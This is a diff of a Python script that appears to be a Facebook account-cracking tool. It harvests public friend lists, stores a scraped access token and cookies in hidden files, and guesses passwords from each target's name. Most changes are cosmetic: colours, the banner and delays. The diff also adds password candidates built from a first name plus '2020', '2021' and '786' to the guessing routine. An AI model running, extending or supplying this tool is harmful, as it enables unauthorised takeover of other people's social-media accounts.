@@ -73,15 +73,15 @@ id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni=
 cokbrut=[]
 pwpluss,pwnya=[],[]
 #------------[ WARNA ]--------------#
-P = '\033[0;00m'
-M = '\033[1;91m'
+P =  '\033[0;00m'
+M = '\033[94;1m'
 H = '\x1b[1;92m'
-K = '\x1b[1;93m'
+K = '\x1b[1;92m'
 B = '\x1b[1;94m'
 U = '\x1b[1;95m' 
 O = '\x1b[1;96m'
 N = '\x1b[0m'    
-Z = "\033[1;30m"
+Z = "\033[96;1m"
 sir = '\033[41m\x1b[1;97m'
 x = '\33[93m' # DEFAULT
 m = '\x1b[1;91m' #RED +
@@ -111,16 +111,16 @@ def back():
 #------------------[ LOGO-BANNER ]-----------------#
 def banner():
 	clear()
-	sol()
-	ban='''
+	print("""%s\n\033[92;1m 
+
 __    __  ____  _____   ____  ____   ___
-|  |__|  ||    ||     | /    ||    \ |   \
-|  |  |  | |  | |__/  ||  o  ||  D  )|    \
-|  |  |  | |  | |   __||     ||    / |  D  |
+|  |__|  ||    ||     | /    ||    \ |   \ 
+|  |  |  | |  | |__/  ||  o  ||  D  )|    \ 
+|  |  |  | |  | |   __||     ||    / |  D  | 
 |  `  '  | |  | |  /  ||  _  ||    \ |     |
  \      /  |  | |     ||  |  ||  .  \|     |
-  \_/\_/  |____||_____||__|__||__|\_||_____!
-                                            '''
+  \_/\_/  |____||_____||__|__||__|\_||_____!"""%(h))
+
 #--------------------[ BAGIAN-MASUK ]--------------#
 def login():
 	try:
@@ -152,7 +152,7 @@ def login_lagi334():
 		find_token = re.search("(EAAG\w+)", data.text)
 		ken=open(".token.txt", "w").write(find_token.group(1))
 		cok=open(".cok.txt", "w").write(cookie)
-		print(f'  {x}[{h}•{x}]{h} LOGIN SUCCESSFUL.........Run the command again!!!!{x} ');time.sleep(1)
+		print(f'  {x}[{h}•{x}]{h} LOGIN SUCCESSFUL.........Run the command again!!!!{x} ');time.sleep(2)
 		exit()
 	except Exception as e:
 		os.system("rm -f .token.txt")
@@ -166,7 +166,7 @@ def menu(my_name,my_id):
 		cok = open('.cok.txt','r').read()
 	except IOError:
 		print('[×] Expired Cookies ')
-		time.sleep(5)
+		time.sleep(7)
 		login_lagi334()
 	os.system('clear')
 	banner()
@@ -175,9 +175,9 @@ def menu(my_name,my_id):
 	renv_xy(f'>> Your Id  : '+str(my_id))
 	renv_xy(f'>> Your Ip  : {ip}')
 	print(f'>> Github   : wiz13')
-	print(f'>> Version  : {H}W.I.Z{x} ')
+	print(f'>> Version  : {H}FREE{x} ')
 	print('')
-	cetak('[white]1. Crack Public\n0. Exit[white]')
+	cetak('[blue] 1. Crack Public\n 0. Exit[red]')
 	_____renv__renv_____ = input('\n>> Select : ')
 	print('')
 	if _____renv__renv_____ in ['1']:
@@ -192,7 +192,7 @@ def menu(my_name,my_id):
 		back()
 def error():
 	print(f'{k}>> Sorry, this feature is still being fixed {x}')
-	time.sleep(4)
+	time.sleep(6)
 	back()
 #-------------------[ CRACK-PUBLIK ]----------------#
 def dump_massal():
@@ -239,7 +239,7 @@ def dump_massal():
 		back()
 	except (KeyError,IOError):
 		print(f'>>{k} Friendship Not Public {x}')
-		time.sleep(3)
+		time.sleep(5)
 		back()
 #-------------[ PENGATURAN-IDZ ]---------------#
 def setting():
@@ -321,6 +321,9 @@ def passwrd():
 					pwv.append(frs+'321')
 					pwv.append(frs+'1234')
 					pwv.append(frs+'12345')
+					pwv.append(frs+'2020')
+					pwv.append(frs+'2021')
+					pwv.append(frs+'786')
 			else:
 				if len(frs)<3:
 					pwv.append(nmf)
@@ -330,6 +333,9 @@ def passwrd():
 					pwv.append(frs+'321')
 					pwv.append(frs+'1234')
 					pwv.append(frs+'12345')
+					pwv.append(frs+'2020')
+					pwv.append(frs+'2021')
+					pwv.append(frs+'786')
 			if 'ya' in pwpluss:
 				for xpwd in pwnya:
 					pwv.append(xpwd)
@@ -485,7 +491,7 @@ if __name__=='__main__':
 	except:pass
 	try:os.system('touch .prox.txt')
 	except:pass
-    os.system("xdg-open https://www.facebook.com/profile.php?id=100011355877620")
+os.system("xdg-open https://www.facebook.com/profile.php?id=100011355877620")
 login()
 
         
